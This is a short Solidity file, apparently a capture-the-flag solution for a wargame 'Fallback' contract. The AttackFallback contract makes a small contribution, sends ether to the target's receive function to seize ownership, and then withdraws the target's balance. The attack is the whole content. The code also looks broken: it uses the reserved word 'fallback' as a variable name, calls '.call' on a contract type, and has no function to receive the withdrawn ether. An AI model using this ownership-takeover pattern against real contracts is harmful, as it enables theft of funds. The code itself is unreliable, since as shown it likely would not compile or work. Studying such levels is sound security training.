// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Fallback} from "../contracts/Fallback.sol";

/*
Process
1) First send less tha 0.001 ethers to make a member in contribution.
2) After become a contributer send some ethers for the receive function to become owner.
3) withdraw the money.
*/

contract AttackFallback {
    Fallback fallback;

    constructor(address _fallback) {
        fallback = Fallback(_fallback);
    }

    function attack() external payable{
        fallback.contribute{value : 0.0001 ether}();
        fallback.call{value: 0.001 ether}();
        fallback.withdraw();
    }
}